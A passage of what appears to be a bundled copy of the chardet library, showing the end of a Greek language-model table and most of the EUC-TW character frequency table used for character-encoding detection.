2,2,2,2,2,0,1,2,0,0,0,2,2,0,1,0,2,0,0,2,2,0,0,0,0,0,0,\n0,0,0,0,1,0,0,0,0,0,0,0,3,0,0,2,0,0,0,0,0,0,0,0,2,0,2,0,0,0,0,2,\n0,1,2,0,0,0,0,2,2,1,0,1,0,1,0,2,2,2,1,0,0,0,0,0,0,1,0,0,0,0,0,0,\n0,2,0,1,2,0,0,0,0,0,0,0,0,0,0,2,0,0,2,2,0,0,0,0,1,0,0,0,0,0,0,2,\n0,2,2,0,0,0,0,2,2,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,\n0,2,2,2,2,0,0,0,3,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,2,0,0,0,0,0,0,1,\n0,0,2,0,0,0,0,1,2,0,0,0,0,0,0,2,2,1,1,0,0,0,0,0,0,1,0,0,0,0,0,0,\n0,2,0,2,2,2,0,0,2,0,0,0,0,0,0,0,2,2,2,0,0,0,2,0,0,0,0,0,0,0,0,2,\n0,0,1,0,0,0,0,2,1,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,\n0,3,0,2,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,2,0,0,0,0,2,\n0,0,2,0,0,0,0,2,2,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,2,0,2,2,1,0,0,0,0,0,0,2,0,0,2,0,2,2,2,0,0,0,0,0,0,2,0,0,0,0,2,\n0,0,2,0,0,2,0,2,2,0,0,0,0,2,0,2,0,0,0,0,0,2,0,0,0,2,0,0,0,0,0,0,\n0,0,3,0,0,0,2,2,0,2,2,0,0,0,0,0,2,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,\n0,2,2,2,2,2,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,\n0,0,0,0,0,0,0,2,1,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,2,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,\n0,2,0,0,0,2,0,0,0,0,0,1,0,0,0,0,2,2,0,0,0,1,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,2,0,0,0,\n0,2,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,2,0,2,0,0,0,\n0,0,0,0,0,0,0,0,2,1,0,0,0,0,0,0,2,0,0,0,1,2,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n)\n\nLatin7GreekModel = {\n  'char_to_order_map': Latin7_char_to_order_map,\n  'precedence_matrix': GreekLangModel,\n  'typical_positive_ratio': 0.982851,\n  'keep_english_letter': False,\n  'charset_name': \"ISO-8859-7\",\n  'language': 'Greek',\n}\n\nWin1253GreekModel = {\n  'char_to_order_map': win1253_char_to_order_map,\n  'precedence_matrix': GreekLangModel,\n  'typical_positive_ratio': 0.982851,\n  'keep_english_letter': False,\n  'charset_name': \"windows-1253\",\n  'language': 'Greek',\n}\n", "thirdparty/chardet/euctwfreq.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# EUCTW frequency table\n# Converted from big5 work\n# by Taiwan's Mandarin Promotion Council\n# <http:#www.edu.tw:81/mandr/>\n\n# 128  --> 0.42261\n# 256  --> 0.57851\n# 512  --> 0.74851\n# 1024 --> 0.89384\n# 2048 --> 0.97583\n#\n# Idea Distribution Ratio = 0.74851/(1-0.74851) =2.98\n# Random Distribution Ration = 512/(5401-512)=0.105\n#\n# Typical Distribution Ratio about 25% of Ideal one, still much higher than RDR\n\nEUCTW_TYPICAL_DISTRIBUTION_RATIO = 0.75\n\n# Char to FreqOrder table ,\nEUCTW_TABLE_SIZE = 5376\n\nEUCTW_CHAR_TO_FREQ_ORDER = (\n   1,1800,1506, 255,1431, 198,   9,  82,   6,7310, 177, 202,3615,1256,2808, 110,  # 2742\n3735,  33,3241, 261,  76,  44,2113,  16,2931,2184,1176, 659,3868,  26,3404,2643,  # 2758\n1198,3869,3313,4060, 410,2211, 302, 590, 361,1963,   8, 204,  58,4296,7311,1931,  # 2774\n  63,7312,7313, 317,1614,  75, 222, 159,4061,2412,1480,7314,3500,3068, 224,2809,  # 2790\n3616,   3,  10,3870,1471,  29,2774,1135,2852,1939, 873, 130,3242,1123, 312,7315,  # 2806\n4297,2051, 507, 252, 682,7316, 142,1914, 124, 206,2932,  34,3501,3173,  64, 604,  # 2822\n7317,2494,1976,1977, 155,1990, 645, 641,1606,7318,3405, 337,  72, 406,7319,  80,  # 2838\n 630, 238,3174,1509, 263, 939,1092,2644, 756,1440,1094,3406, 449,  69,2969, 591,  # 2854\n 179,2095, 471, 115,2034,1843,  60,  50,2970, 134, 806,1868, 734,2035,3407, 180,  # 2870\n 995,1607, 156, 537,2893, 688,7320, 319,1305, 779,2144, 514,2374, 298,4298, 359,  # 2886\n2495,  90,2707,1338, 663,  11, 906,1099,2545,  20,2436, 182, 532,1716,7321, 732,  # 2902\n1376,4062,1311,1420,3175,  25,2312,1056, 113, 399, 382,1949, 242,3408,2467, 529,  # 2918\n3243, 475,1447,3617,7322, 117,  21, 656, 810,1297,2295,2329,3502,7323, 126,4063,  # 2934\n 706, 456, 150, 613,4299,  71,1118,2036,4064, 145,3069,  85, 835, 486,2114,1246,  # 2950\n1426, 428, 727,1285,1015, 800, 106, 623, 303,1281,7324,2127,2354, 347,3736, 221,  # 2966\n3503,3110,7325,1955,1153,4065,  83, 296,1199,3070, 192, 624,  93,7326, 822,1897,  # 2982\n2810,3111, 795,2064, 991,1554,1542,1592,  27,  43,2853, 859, 139,1456, 860,4300,  # 2998\n 437, 712,3871, 164,2392,3112, 695, 211,3017,2096, 195,3872,1608,3504,3505,3618,  # 3014\n3873, 234, 811,2971,2097,3874,2229,1441,3506,1615,2375, 668,2076,1638, 305, 228,  # 3030\n1664,4301, 467, 415,7327, 262,2098,1593, 239, 108, 300, 200,1033, 512,1247,2077,  # 3046\n7328,7329,2173,3176,3619,2673, 593, 845,1062,3244,  88,1723,2037,3875,1950, 212,  # 3062\n 266, 152, 149, 468,1898,4066,4302,  77, 187,7330,3018,  37,   5,2972,7331,3876,  # 3078\n7332,7333,  39,2517,4303,2894,3177,2078,  55, 148,  74,4304, 545, 483,1474,1029,  # 3094\n1665, 217,1869,1531,3113,1104,2645,4067,  24, 172,3507, 900,3877,3508,3509,4305,  # 3110\n  32,1408,2811,1312, 329, 487,2355,2247,2708, 784,2674,   4,3019,3314,1427,1788,  # 3126\n 188, 109, 499,7334,3620,1717,1789, 888,1217,3020,4306,7335,3510,7336,3315,1520,  # 3142\n3621,3878, 196,1034, 775,7337,7338, 929,1815, 249, 439,  38,7339,1063,7340, 794,  # 3158\n3879,1435,2296,  46, 178,3245,2065,7341,2376,7342, 214,1709,4307, 804,  35, 707,  # 3174\n 324,3622,1601,2546, 140, 459,4068,7343,7344,1365, 839, 272, 978,2257,2572,3409,  # 3190\n2128,1363,3623,1423, 697, 100,3071,  48,  70,1231, 495,3114,2193,7345,1294,7346,  # 3206\n2079, 462, 586,1042,3246, 853, 256, 988, 185,2377,3410,1698, 434,1084,7347,3411,  # 3222\n 314,2615,2775,4308,2330,2331, 569,2280, 637,1816,2518, 757,1162,1878,1616,3412,  # 3238\n 287,1577,2115, 768,4309,1671,2854,3511,2519,1321,3737, 909,2413,7348,4069, 933,  # 3254\n3738,7349,2052,2356,1222,4310, 765,2414,1322, 786,4311,7350,1919,1462,1677,2895,  # 3270\n1699,7351,4312,1424,2437,3115,3624,2590,3316,1774,1940,3413,3880,4070, 309,1369,  # 3286\n1130,2812, 364,2230,1653,1299,3881,3512,3882,3883,2646, 525,1085,3021, 902,2000,  # 3302\n1475, 964,4313, 421,1844,1415,1057,2281, 940,1364,3116, 376,4314,4315,1381,   7,  # 3318\n2520, 983,2378, 336,1710,2675,1845, 321,3414, 559,1131,3022,2742,1808,1132,1313,  # 3334\n 265,1481,1857,7352, 352,1203,2813,3247, 167,1089, 420,2814, 776, 792,1724,3513,  # 3350\n4071,2438,3248,7353,4072,7354, 446, 229, 333,2743, 901,3739,1200,1557,4316,2647,  # 3366\n1920, 395,2744,2676,3740,4073,1835, 125, 916,3178,2616,4317,7355,7356,3741,7357,  # 3382\n7358,7359,4318,3117,3625,1133,2547,1757,3415,1510,2313,1409,3514,7360,2145, 438,  # 3398\n2591,2896,2379,3317,1068, 958,3023, 461, 311,2855,2677,4074,1915,3179,4075,1978,  # 3414\n 383, 750,2745,2617,4076, 274, 539, 385,1278,1442,7361,1154,1964, 384, 561, 210,  # 3430\n  98,1295,2548,3515,7362,1711,2415,1482,3416,3884,2897,1257, 129,7363,3742, 642,  # 3446\n 523,2776,2777,2648,7364, 141,2231,1333,  68, 176, 441, 876, 907,4077, 603,2592,  # 3462\n 710, 171,3417, 404, 549,  18,3118,2393,1410,3626,1666,7365,3516,4319,2898,4320,  # 3478\n7366,2973, 368,7367, 146, 366,  99, 871,3627,1543, 748, 807,1586,1185,  22,2258,  # 3494\n 379,3743,3180,7368,3181, 505,1941,2618,1991,1382,2314,7369, 380,2357, 218, 702,  # 3510\n1817,1248,3418,3024,3517,3318,3249,7370,2974,3628, 930,3250,3744,7371,  59,7372,  # 3526\n 585, 601,4078, 497,3419,1112,1314,4321,1801,7373,1223,1472,2174,7374, 749,1836,  # 3542\n 690,1899,3745,1772,3885,1476, 429,1043,1790,2232,2116, 917,4079, 447,1086,1629,  # 3558\n7375, 556,7376,7377,2020,1654, 844,1090, 105, 550, 966,1758,2815,1008,1782, 686,  # 3574\n1095,7378,2282, 793,1602,7379,3518,2593,4322,4080,2933,2297,4323,3746, 980,2496,  # 3590\n 544, 353, 527,4324, 908,2678,2899,7380, 381,2619,1942,1348,7381,1341,1252, 560,  # 3606\n3072,7382,3420,2856,7383,2053, 973, 886,2080, 143,4325,7384,7385, 157,3886, 496,  # 3622\n4081,  57, 840, 540,2038,4326,4327,3421,2117,1445, 970,2259,1748,1965,2081,4082,  # 3638\n3119,1234,1775,3251,2816,3629, 773,1206,2129,1066,2039,1326,3887,1738,1725,4083,  # 3654\n 279,3120,  51,1544,2594, 423,1578,2130,2066, 173,4328,1879,7386,7387,1583, 264,  # 3670\n 610,3630,4329,2439, 280, 154,7388,7389,7390,1739, 338,1282,3073, 693,2857,1411,  # 3686\n1074,3747,2440,7391,4330,7392,7393,1240, 952,2394,7394,2900,1538,2679, 685,1483,  # 3702\n4084,2468,1436, 953,4085,2054,4331, 671,2395,  79,4086,2441,3252, 608, 567,2680,  # 3718\n3422,4087,4088,1691, 393,1261,1791,2396,7395,4332,7396,7397,7398,7399,1383,1672,  # 3734\n3748,3182,1464, 522,1119, 661,1150, 216, 675,4333,3888,1432,3519, 609,4334,2681,  # 3750\n2397,7400,7401,7402,4089,3025,   0,7403,2469, 315, 231,2442, 301,3319,4335,2380,  # 3766\n7404, 233,4090,3631,1818,4336,4337,7405,  96,1776,1315,2082,7406, 257,7407,1809,  # 3782\n3632,2709,1139,1819,4091,2021,1124,2163,2778,1777,2649,7408,3074, 363,1655,3183,  # 3798\n7409,2975,7410,7411,7412,3889,1567,3890, 718, 103,3184, 849,1443, 341,3320,2934,  # 3814\n1484,7413,1712, 127,  67, 339,4092,2398, 679,1412, 821,7414,7415, 834, 738, 351,  # 3830\n2976,2146, 846, 235,1497,1880, 418,1992,3749,2710, 186,1100,2147,2746,3520,1545,  # 3846\n1355,2935,2858,1377, 583,3891,4093,2573,2977,7416,1298,3633,1078,2549,3634,2358,  # 3862\n  78,3750,3751, 267,1289,2099,2001,1594,4094, 348, 369,1274,2194,2175,1837,4338,  # 3878\n1820,2817,3635,2747,2283,2002,4339,2936,2748, 144,3321, 882,4340,3892,2749,3423,  # 3894\n4341,2901,7417,4095,1726, 320,7418,3893,3026, 788,2978,7419,2818,1773,1327,2859,  # 3910\n3894,2819,7420,1306,4342,2003,1700,3752,3521,2359,2650, 787,2022, 506, 824,3636,  # 3926\n 534, 323,4343,1044,3322,2023,1900, 946,3424,7421,1778,1500,1678,7422,1881,4344,  # 3942\n 165, 243,4345,3637,2521, 123, 683,4096, 764,4346,  36,3895,1792, 589,2902, 816,  # 3958\n 626,1667,3027,2233,1639,1555,1622,3753,3896,7423,3897,2860,1370,1228,1932, 891,  # 3974\n2083,2903, 304,4097,7424, 292,2979,2711,3522, 691,2100,4098,1115,4347, 118, 662,  # 3990\n7425, 611,1156, 854,2381,1316,2861,   2, 386, 515,2904,7426,7427,3253, 868,2234,  # 4006\n1486, 855,2651, 785,2212,3028,7428,1040,3185,3523,7429,3121, 448,7430,1525,7431,  # 4022\n2164,4348,7432,3754,7433,4099,2820,3524,3122, 503, 818,3898,3123,1568, 814, 676,  # 4038\n1444, 306,1749,7434,3755,1416,1030, 197,1428, 805,2821,1501,4349,7435,7436,7437,  # 4054\n1993,7438,4350,7439,7440,2195,  13,2779,3638,2980,3124,1229,1916,7441,3756,2131,  # 4070\n7442,4100,4351,2399,3525,7443,2213,1511,1727,1120,7444,7445, 646,3757,2443, 307,  # 4086\n7446,7447,1595,3186,7448,7449,7450,3639,1113,1356,3899,1465,2522,2523,7451, 519,  # 4102\n7452, 128,2132,  92,2284,1979,7453,3900,1512, 342,3125,2196,7454,2780,2214,1980,  # 4118\n3323,7455, 290,1656,1317, 789, 827,2360,7456,3758,4352, 562, 581,3901,7457, 401,  # 4134\n4353,2248,  94,4354,1399,2781,7458,1463,2024,4355,3187,1943,7459, 828,1105,4101,  # 4150\n1262,1394,7460,4102, 605,4356,7461,1783,2862,7462,2822, 819,2101, 578,2197,2937,  # 4166\n7463,1502, 436,3254,4103,3255,2823,3902,2905,3425,3426,7464,2712,2315,7465,7466,  # 4182\n2332,2067,  23,4357, 193, 826,3759,2102, 699,1630,4104,3075, 390,1793,1064,3526,  # 4198\n7467,1579,3076,3077,1400,7468,4105,1838,1640,2863,7469,4358,4359, 137,4106, 598,  # 4214\n3078,1966, 780, 104, 974,2938,7470, 278, 899, 253, 402, 572, 504, 493,1339,7471,  # 4230\n3903,1275,4360,2574,2550,7472,3640,3029,3079,2249, 565,1334,2713, 863,  41,7473,  # 4246\n7474,4361,7475,1657,2333,  19, 463,2750,4107, 606,7476,2981,3256,1087,2084,1323,  # 4262\n2652,2982,7477,1631,1623,1750,4108,2682,7478,2864, 791,2714,2653,2334, 232,2416,  # 4278\n7479,2983,1498,7480,2654,2620, 755,1366,3641,3257,3126,2025,1609, 119,1917,3427,  # 4294\n 862,1026,4109,7481,3904,3760,4362,3905,4363,2260,1951,2470,7482,1125, 817,4110,  # 4310\n4111,3906,1513,1766,2040,1487,4112,3030,3258,2824,3761,3127,7483,7484,1507,7485,  # 4326\n2683, 733,  40,1632,1106,2865, 345,4113, 841,2524, 230,4364,2984,1846,3259,3428,  # 4342\n7486,1263, 986,3429,7487, 735, 879, 254,1137, 857, 622,1300,1180,1388,1562,3907,  # 4358\n3908,2939, 967,2751,2655,1349, 592,2133,1692,3324,2985,1994,4114,1679,3909,1901,  # 4374\n2185,7488, 739,3642,2715,1296,1290,7489,4115,2198,2199,1921,1563,2595,2551,1870,  # 4390\n2752,2986,7490, 435,7491, 343,1108, 596,  17,1751,4365,2235,3430,3643,7492,4366,  # 4406\n 294,3527,2940,1693, 477, 979, 281,2041,3528, 643,2042,3644,2621,2782,2261,1031,  # 4422\n2335,2134,2298,3529,4367, 367,1249,2552,7493,3530,7494,4368,1283,3325,2004, 240,  # 4438\n1762,3326,4369,4370, 836,1069,3128, 474,7495,2148,2525, 268,3531,7496,3188,1521,  # 4454\n1284,7497,1658,1546,4116,7498,3532,3533,7499,4117,3327,2684,1685,4118, 961,1673,  # 4470\n2622, 190,2005,2200,3762,4371,4372,7500, 570,2497,3645,1490,7501,4373,2623,3260,  # 4486\n1956,4374, 584,1514, 396,1045,1944,7502,4375,1967,2444,7503,7504,4376,3910, 619,  # 4502\n7505,3129,3261, 215,2006,2783,2553,3189,4377,3190,4378, 763,4119,3763,4379,7506,  # 4518\n7507,1957,1767,2941,3328,3646,1174, 452,1477,4380,3329,3130,7508,2825,1253,2382,  # 4534\n2186,1091,2285,4120, 492,7509, 638,1169,1824,2135,1752,3911, 648, 926,1021,1324,  # 4550\n4381, 520,4382, 997, 847,1007, 892,4383,3764,2262,1871,3647,7510,2400,1784,4384,  # 4566\n1952,2942,3080,3191,1728,4121,2043,3648,4385,2007,1701,3131,1551,  30,2263,4122,  # 4582\n7511,2026,4386,3534,7512, 501,7513,4123, 594,3431,2165,1821,3535,3432,3536,3192,  # 4598\n 829,2826,4124,7514,1680,3132,1225,4125,7515,3262,4387,4126,3133,2336,7516,4388,  # 4614\n4127,7517,3912,3913,7518,1847,2383,2596,3330,7519,4389, 374,3914, 652,4128,4129,  # 4630\n 375,1140, 798,7520,7521,7522,2361,4390,2264, 546,1659, 138,3031,2445,4391,7523,  # 4646\n2250, 612,1848, 910, 796,3765,1740,1371, 825,3766,3767,7524,2906,2554,7525, 692,  # 4662\n 444,3032,2624, 801,4392,4130,7526,1491, 244,1053,3033,4131,4132, 340,7527,3915,  # 4678\n1041,2987, 293,1168,  87,1357,7528,1539, 959,7529,2236, 721, 694,4133,3768, 219,  # 4694\n1478, 644,1417,3331,2656,1413,1401,1335,1389,3916,7530,7531,2988,2362,3134,1825,  # 4710\n 730,1515, 184,2827,  66,4393,7532,1660,2943, 246,3332, 378,1457, 226,3433, 975,  # 4726\n3917,2944,1264,3537, 674, 696,7533, 163,7534,1141,2417,2166, 713,3538,3333,4394,  # 4742\n3918,7535,7536,1186,  15,7537,1079,1070,7538,1522,3193,3539, 276,1050,2716, 758,  # 4758\n1126, 653,2945,3263,7539,2337, 889,3540,3919,3081,2989, 903,1250,4395,3920,3434,  # 4774\n3541,1342,1681,1718, 766,3264, 286,  89,2946,3649,7540,1713,7541,2597,3334,2990,  # 4790\n7542,2947,2215,3194,2866,7543,4396,2498,2526, 181, 387,1075,3921, 731,2187,3335,  # 4806\n7544,3265, 310, 313,3435,2299, 770,4134,  54,3034, 189,4397,3082,3769,3922,7545,  # 4822\n1230,1617,1849, 355,3542,4135,4398,3336, 111,4136,3650,1350,3135,3436,3035,4137,  # 4838\n2149,3266,3543,7546,2784,3923,3924,2991, 722,2008,7547,1071, 247,1207,2338,2471,  # 4854\n1378,4399,2009, 864,1437,1214,4400, 373,3770,1142,2216, 667,4401, 442,2753,2555,  # 4870\n3771,3925,1968,4138,3267,1839, 837, 170,1107, 934,1336,1882,7548,7549,2118,4139,  # 4886\n2828, 743,1569,7550,4402,4140, 582,2384,1418,3437,7551,1802,7552, 357,1395,1729,  # 4902\n3651,3268,2418,1564,2237,7553,3083,3772,1633,4403,1114,2085,4141,1532,7554, 482,  # 4918\n2446,4404,7555,7556,1492, 833,1466,7557,2717,3544,1641,2829,7558,1526,1272,3652,  # 4934\n4142,1686,1794, 416,2556,1902,1953,1803,7559,3773,2785,3774,1159,2316,7560,2867,  # 4950\n4405,1610,1584,3036,2419,2754, 443,3269,1163,3136,7561,7562,3926,7563,4143,2499,  # 4966\n3037,4406,3927,3137,2103,1647,3545,2010,1872,4144,7564,4145, 431,3438,7565, 250,  # 4982\n  97,  81,4146,7566,1648,1850,1558, 160, 848,7567, 866, 740,1694,7568,2201,2830,  # 4998\n3195,4147,4407,3653,1687, 950,2472, 426, 469,3196,3654,3655,3928,7569,7570,1188,  # 5014\n 424,1995, 861,3546,4148,3775,2202,2685, 168,1235,3547,4149,7571,2086,1674,4408,  # 5030\n3337,3270, 220,2557,1009,7572,3776, 670,2992, 332,1208, 717,7573,7574,3548,2447,  # 5046\n3929,3338,7575, 513,7576,1209,2868,3339,3138,4409,1080,7577,7578,7579,7580,2527,  # 5062\n3656,3549, 815,1587,3930,3931,7581,3550,3439,3777,1254,4410,1328,3038,1390,3932,  # 5078\n1741,3933,3778,3934,7582, 236,3779,2448,3271,7583,7584,3657,3780,1273,3781,4411,  # 5094\n7585, 308,7586,4412, 245,4413,1851,2473,1307,2575, 430, 715,2136,2449,7587, 270,  # 5110\n 199,2869,3935,7588,3551,2718,1753, 761,1754, 725,1661,1840,4414,3440,3658,7589,  # 5126\n7590, 587,  14,3272, 227,2598, 326, 480,2265, 943,2755,3552, 291, 650,1883,7591,  # 5142\n1702,1226, 102,1547,  62,3441, 904,4415,3442,1164,4150,7592,7593,1224,1548,2756,  # 5158\n 391, 498,1493,7594,1386,1419,7595,2055,1177,4416, 813, 880,1081,2363, 566,1145,  # 5174\n4417,2286,1001,1035,2558,2599,2238, 394,1286,7596,7597,2068,7598,  86,1494,1730,  # 5190\n3936, 491,1588, 745, 897,2948, 843,3340,3937,2757,2870,3273,1768, 998,2217,2069,  # 5206\n 397,1826,1195,1969,3659,2993,3341, 284,7599,3782,2500,2137,2119,1903,7600,3938,  # 5222\n2150,3939,4151,1036,3443,1904, 114,2559,4152, 209,1527,7601,7602,2949,2831,2625,  # 5238\n2385,2719,3139, 812,2560,7603,3274,7604,1559, 737,1884,3660,1210, 885,  28,2686,  # 5254\n3553,3783,7605,4153,1004,1779,4418,7606, 346,1981,2218,2687,4419,3784,1742, 797,  # 5270\n1642,3940,1933,1072,1384,2151, 896,3941,3275,3661,3197,2871,3554,7607,2561,1958,  # 5286\n4420,2450,1785,7608,7609,7610,3942,4154,1005,1308,3662,4155,2720,4421,4422,1528,  # 5302\n2600, 161,1178,4156,1982, 987,4423,1101,4157, 631,3943,1157,3198,2420,1343,1241,  # 5318\n1016,2239,2562, 372, 877,2339,2501,1160, 555,1934, 911,3944,7611, 466,1170, 169,  # 5334\n1051,2907,2688,3663,2474,2994,1182,2011,2563,1251,2626,7612, 992,2340,3444,1540,  # 5350\n2721,1201,2070,2401,1996,2475,7613,4424, 528,1922,2188,1503,1873,1570,2364,3342,  # 5366\n3276,7614, 557,1073,7615,1827,3445,2087,2266,3140,3039,3084, 767,3085,2786,4425,  # 5382\n1006,4158,4426,2341,1267,2176,3664,3199, 778,3945,3200,2722,1597,2657,7616,4427,  # 5398\n7617,3446,7618,7619,7620,3277,2689,1433,3278, 131,  95,1504,3946, 723,4159,3141,  # 5414\n1841,3555,2758,2189,3947,2027,2104,3665,7621,2995,3948,1218,7622,3343,3201,3949,  # 5430\n4160,2576, 248,1634,3785, 912,7623,2832,3666,3040,3786, 654,  53,7624,2996,7625,  # 5446\n1688,4428, 777,3447,1032,3950,1425,7626, 191, 820,2120,2833, 971,4429, 931,3202,  # 5462\n 135, 664, 783,3787,1997, 772,2908,1935,3951,3788,4430,2909,3203, 282,2723, 640,  # 5478\n1372,3448,1127, 922, 325,3344,7627,7628, 711,2044,7629,7630,3952,2219,2787,1936,  # 5494\n3953,3345,2220,2251,3789,2300,7631,4431,3790,1258,3279,3954,3204,2138,2950,3955,  # 5510\n3956,7632,2221, 258,3205,4432, 101,1227,7633,3280,1755,7634,1391,3281,7635,2910,  # 5526\n2056, 893,7636,7637,7638,1402,4161,2342,7639,7640,3206,3556,7641,7642, 878,1325,  # 5542\n1780,2788,4433, 259,1385,2577, 744,1183,2267,4434,7643,3957,2502,7644, 684,1024,  # 5558\n4162,7645, 472,3557,3449,1165,3282,3958,3959, 322,2152, 881, 455,1695,1152,1340,  # 5574\n 660, 554,2153,4435,1058,4436,4163, 830,1065,3346,3960,4437,1923,7646,1703,1918,  # 5590\n7647, 932,2268, 122,7648,4438, 947, 677,7649,3791,2627, 297,1905,1924,2269,4439,  # 5606\n2317,3283,7650,7651,4164,7652,4165,  84,4166, 112, 989,7653, 547,1059,3961, 701,  # 5622\n3558,1019,7654,4167,7655,3450, 942, 639, 457,2301,2451, 993,2951, 407, 851, 494,  # 5638\n4440,3347, 927,7656,1237,7657,2421,3348, 573,4168, 680, 921,2911,1279,1874, 285,  # 5654\n 790,1448,1983, 719,2167,7658,7659,4441,3962,3963,1649,7660,1541, 563,7661,1077,  # 5670\n7662,3349,3041,3451, 511,2997,3964,3965,3667,3966,1268,2564,3350,3207,4442,4443,  # 5686\n7663, 535,1048,1276,1189,2912,2028,3142,1438,1373,2834,2952,1134,2012,7664,4169,  # 5702\n1238,2578,3086,1259,7665, 700,7666,2953,3143,3668,4170,7667,4171,1146,1875,1906,  # 5718\n4444,2601,3967, 781,2422, 132,1589, 203, 147, 273,2789,2402, 898,1786,2154,3968,  # 5734\n3969,7668,3792,2790,7669,7670,4445,4446,7671,3208,7672,1635,3793, 965,7673,1804,  # 5750\n2690,1516,3559,1121,1082,1329,3284,3970,1449,3794,  65,1128,2835,2913,2759,1590,  # 5766\n3795,7674,7675,  12,2658,  45, 976,2579,3144,4447, 517,2528,1013,1037,3209,7676,  # 5782\n3796,2836,7677,3797,7678,3452,7679,2602, 614,1998,2318,3798,3087,2724,2628,7680,  # 5798\n2580,4172, 599,1269,7681,1810,3669,7682,2691,3088, 759,1060, 489,1805,3351,3285,  # 5814\n1358,7683,7684,2386,1387,1215,2629,2252, 490,7685,7686,4173,1759,2387,2343,7687,  # 5830\n4448,3799,1907,3971,2630,1806,3210,4449,3453,3286,2760,2344, 874,7688,7689,3454,  # 5846\n3670,1858,  91,2914,3671,3042,3800,4450,7690,3145,3972,2659,7691,3455,1202,1403,  # 5862\n3801,2954,2529,1517,2503,4451,3456,2504,7692,4452,7693,2692,1885,1495,1731,3973,  # 5878\n2365,4453,7694,2029,7695,7696,3974,2693,1216, 237,2581,4174,2319,3975,3802,4454,  # 5894\n4455,2694,3560,3457, 445,4456,7697,7698,7699,7700,2761,  61,3976,3672,1822,3977,  # 5910\n7701, 687,2045, 935, 925, 405,2660, 703,1096,1859,2725,4457,3978,1876,1367,2695,  # 5926\n3352, 918,2105,1781,2476, 334,3287,1611,1093,4458, 564,3146,3458,3673,3353, 945,  # 5942\n2631,2057,4459,7702,1925, 872,4175,7703,3459,2696,3089, 349,4176,3674,3979,4460,  # 5958\n3803,4177,3675,2155,3980,4461,4462,4178,4463,2403,2046, 782,3981, 400, 251,4179,  # 5974\n1624,7704,7705, 277,3676, 299,1265, 476,1191,3804,2121,4180,4181,1109, 205,7706,  # 5990\n2582,1000,2156,3561,1860,7707,7708,7709,4464,7710,4465,2565, 107,2477,2157,3982,  # 6006\n3460,3147,7711,1533, 541,1301, 158, 753,4182,2872,3562,7712,1696, 370,1088,4183,  # 6022\n4466,3563, 579, 327, 440, 162,2240, 269,1937,1374,3461, 968,3043,  56,1396,3090,  # 6038\n2106,3288,3354,7713,1926,2158,4467,2998,7714,3564,7715,7716,3677,4468,2478,7717,  # 6054\n2791,7718,1650,4469,7719,2603,7720,7721,3983,2661,3355,1149,3356,3984,3805,3985,  # 6070\n7722,1076,  49,7723, 951,3211,3289,3290, 450,2837, 920,7724,1811,2792,2366,4184,  # 6086\n1908,1138,2367,3806,3462,7725,3212,4470,1909,1147,1518,2423,4471,3807,7726,4472,  # 6102\n2388,2604, 260,1795,3213,7727,7728,3808,3291, 708,7729,3565,1704,7730,3566,1351,  # 6118\n1618,3357,2999,1886, 944,4185,3358,4186,3044,3359,4187,7731,3678, 422, 413,1714,  # 6134\n3292, 500,2058,2345,4188,2479,7732,1344,1910, 